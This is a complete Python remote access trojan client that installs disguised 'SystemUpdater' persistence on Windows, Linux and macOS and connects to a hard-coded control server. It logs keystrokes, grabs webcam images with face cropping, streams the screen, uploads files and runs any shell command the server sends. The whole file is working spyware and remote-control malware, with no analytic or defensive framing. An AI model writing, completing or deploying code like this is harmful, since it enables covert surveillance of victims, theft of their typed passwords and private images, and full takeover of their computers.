import socket
import threading
import subprocess
from pynput.keyboard import Listener, Key
import asyncio
import websockets
import mss
import numpy as np
import cv2
import base64
import time
import logging
import platform
import pyautogui
import os
import sys
from datetime import datetime
import platform
import logging
# === CONFIG ===
SERVER_HOST = "172.16.78.1"  # Update to your server IP
TCP_PORT = 5555
WS_PORT = 8765

logging.basicConfig(level=logging.INFO)
tcp_client = None
tcp_connected = False
tcp_lock = threading.Lock()
ws_connection = None

# === TCP Handler ===
def tcp_handler():
    global tcp_client, tcp_connected
    while True:
        try:
            logging.info("🔁 Connecting to TCP server...")
            with tcp_lock:
                tcp_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tcp_client.settimeout(10)
                tcp_client.connect((SERVER_HOST, TCP_PORT))
                tcp_client.settimeout(None)
            logging.info("✅ TCP Connected")
            send_webcam_image()
            while True:
                data = tcp_client.recv(4096).decode()
                if not data:
                    raise Exception("TCP Server Disconnected")
                if data.startswith("CMD:"):
                    execute_command(data[4:])
        except Exception as e:
            logging.warning(f"[TCP] Disconnected: {e}")
            tcp_connected = False
            try:
                tcp_client.close()
            except:
                pass
            time.sleep(3)

# === TCP Monitor ===
def tcp_monitor():
    global tcp_client, tcp_connected
    while True:
        time.sleep(5)
        if tcp_connected:
            try:
                tcp_client.send(b"PING\n")
            except Exception as e:
                logging.warning(f"[TCP Monitor] Lost connection: {e}")
                tcp_connected = False
                try:
                    tcp_client.close()
                except:
                    pass
                threading.Thread(target=tcp_handler, daemon=True).start()

# === WebSocket Monitor ===
async def ws_monitor():
    global ws_connection
    while True:
        await asyncio.sleep(5)
        try:
            if ws_connection and ws_connection.close_code is not None:
                logging.warning("[WS Monitor] WebSocket closed, restarting stream...")
                await stream_screen()
        except Exception as e:
            logging.warning(f"[WS Monitor] Exception: {e}")




def add_persistence():
    try:
        system = platform.system()
        script_path = os.path.realpath(sys.argv[0])
        python_path = sys.executable

        if system == "Windows":
            import winreg
            command = f'"{python_path}" "{script_path}"'
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, command)
            winreg.CloseKey(key)
            logging.info("[+] Persistence added to Windows registry")

        elif system == "Linux":
            autostart_path = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_path, exist_ok=True)
            desktop_entry = f"""[Desktop Entry]
Type=Application
Exec={python_path} "{script_path}"
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=SystemUpdater
"""
            with open(os.path.join(autostart_path, "systemupdater.desktop"), "w") as f:
                f.write(desktop_entry)
            logging.info("[+] Persistence added to Linux autostart")

        elif system == "Darwin":  # macOS
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.updater.plist")
            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" 
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>{python_path}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
            with open(plist_path, "w") as f:
                f.write(plist_content)
            logging.info("[+] Persistence added to macOS LaunchAgents")

        else:
            logging.warning("[!] Unsupported OS for persistence")

    except Exception as e:
        logging.error(f"[!] Persistence Error: {e}")


def remove_persistence():
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(key, "SystemUpdater")
            winreg.CloseKey(key)
        elif platform.system() == "Linux":
            path = os.path.expanduser("~/.config/autostart/sysupdater.desktop")
            if os.path.exists(path):
                os.remove(path)
        tcp_client.send(b"PERSISTENCE REMOVED\n")
    except Exception as e:
        tcp_client.send(f"REMOVE ERROR: {e}".encode())

# === Keylogger ===
key_buffer = ""
last_send = time.time()

def format_key(key):
    try:
        return key.char
    except AttributeError:
        return {
            Key.space: " ",
            Key.enter: "[ENTER]",
            Key.backspace: "[BACKSPACE]",
            Key.tab: "\t"
        }.get(key, f"[{key.name.upper()}]")

def on_press(key):
    global key_buffer, last_send
    try:
        if not tcp_connected:
            return
        k = format_key(key)
        if k == "[ENTER]":
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            tcp_client.send(f"KEY: [{timestamp}] {key_buffer}\n".encode())
            key_buffer = ""
        elif k == "[BACKSPACE]":
            key_buffer = key_buffer[:-1]
        elif k:
            key_buffer += k

        if time.time() - last_send > 10 and key_buffer:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            tcp_client.send(f"KEY: [{timestamp}] {key_buffer}\n".encode())
            key_buffer = ""
            last_send = time.time()
    except Exception as e:
        logging.error(f"[Keylogger Error] {e}")

def keylogger_thread():
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        logging.error(f"[Keylogger Thread Error] {e}")

# === Command Execution ===
def execute_command(command):
    try:
        if command == "REMOVE_PERSISTENCE":
            remove_persistence()
        elif command.startswith("WEBCAM"):
            send_webcam_image()
        elif command.startswith("SCREENSHOT"):
            take_screenshot()
        elif command.startswith("MOUSE_CLICK"):
            pyautogui.click()
        elif command.startswith("MOUSE_MOVE:"):
            _, x, y = command.split(":")
            pyautogui.moveTo(int(x), int(y))
        elif command.startswith("TYPE:"):
            pyautogui.write(command[5:])
        elif command.startswith("LISTDIR"):
            files = os.listdir(".")
            tcp_client.send(f"FILES: {files}".encode())
        elif command.startswith("CD:"):
            os.chdir(command[3:].strip())
            tcp_client.send(b"CHANGED DIR")
        elif command.startswith("GETFILE:"):
            path = command[8:].strip()
            if os.path.exists(path):
                with open(path, "rb") as f:
                    tcp_client.send(b"FILE:" + base64.b64encode(f.read()))
            else:
                tcp_client.send(b"FILE ERROR: Not found")
        else:
            shell = ["powershell", "-Command", command] if platform.system() == "Windows" else ["/bin/sh", "-c", command]
            result = subprocess.run(shell, capture_output=True, text=True)
            output = f"CMD: {result.stdout}\nERR: {result.stderr}"
            tcp_client.send(output.encode())
    except Exception as e:
        tcp_client.send(f"CMD ERROR: {e}".encode())

def take_screenshot():
    try:
        import mss
        import numpy as np
        import cv2
        import base64
        import time
        logging.info("[SCREENSHOT] Taking screenshot...")
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_BGRA2BGR)
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"screenshot_{timestamp}.jpg"
            cv2.imwrite(filename, frame)
            _, jpeg = cv2.imencode('.jpg', frame)
            b64 = base64.b64encode(jpeg).decode()
            tcp_client.send(f"SCREENSHOT:{b64}".encode())
            logging.info(f"[SCREENSHOT] Screenshot taken and sent as {filename}.")
    except Exception as e:
        logging.error(f"[SCREENSHOT] Exception: {e}")
        tcp_client.send(f"SCREENSHOT ERROR: {e}".encode())

# === Webcam ===
def send_webcam_image():
    try:
        logging.info("[WEBCAM] Attempting to access webcam...")
        # Try multiple camera indexes
        for cam_index in range(3):
            cam = cv2.VideoCapture(cam_index)
            ret, frame = cam.read()
            cam.release()
            if ret:
                logging.info(f"[WEBCAM] Webcam frame captured from index {cam_index}. Shape: {frame.shape}")
                # Save the frame locally for debugging
                cv2.imwrite(f"test_webcam_{cam_index}.jpg", frame)
                face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + "haarcascade_frontalface_default.xml")
                gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                faces = face_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5, minSize=(80, 80))
                if len(faces) > 0:
                    (x, y, w, h) = faces[0]
                    face_img = frame[y:y+h, x:x+w]
                    _, jpeg = cv2.imencode(".jpg", face_img)
                    logging.info(f"[WEBCAM] Face detected and cropped: x={x}, y={y}, w={w}, h={h}")
                else:
                    _, jpeg = cv2.imencode(".jpg", frame)
                    logging.info("[WEBCAM] No face detected, sending full frame.")
                b64 = base64.b64encode(jpeg).decode()
                tcp_client.send(f"WEBCAM:{b64}".encode())
                logging.info("[WEBCAM] Image sent to server.")
                return
        logging.error("[WEBCAM] Camera read failed on all indexes.")
        tcp_client.send(f"WEBCAM ERROR: Camera read failed on all indexes".encode())
    except Exception as e:
        logging.error(f"[WEBCAM] Exception: {e}")
        tcp_client.send(f"WEBCAM ERROR: {e}".encode())

# === Stream Screen ===
async def stream_screen():
    global ws_connection
    while True:
        try:
            uri = f"ws://{SERVER_HOST}:{WS_PORT}"
            ws_connection = await websockets.connect(uri, ping_interval=None, max_size=None)
            logging.info("📡 WebSocket connected")

            with mss.mss() as sct:
                monitor = sct.monitors[1]
                while True:
                    screenshot = sct.grab(monitor)
                    frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_BGRA2BGR)
                    resized = cv2.resize(frame, (1280, 720))
                    _, jpeg = cv2.imencode('.jpg', resized, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
                    b64 = base64.b64encode(jpeg).decode()
                    await ws_connection.send(b64)
                    await asyncio.sleep(0.15)  # ~7 FPS
        except Exception as e:
            logging.warning(f"[WS Reconnect] {e}")
            ws_connection = None
            await asyncio.sleep(2)

# === MAIN ===
async def main():
    add_persistence()
    threading.Thread(target=keylogger_thread, daemon=True).start()
    threading.Thread(target=tcp_handler, daemon=True).start()
    threading.Thread(target=tcp_monitor, daemon=True).start()
    await asyncio.gather(stream_screen(), ws_monitor())

if __name__ == "__main__":
    asyncio.run(main())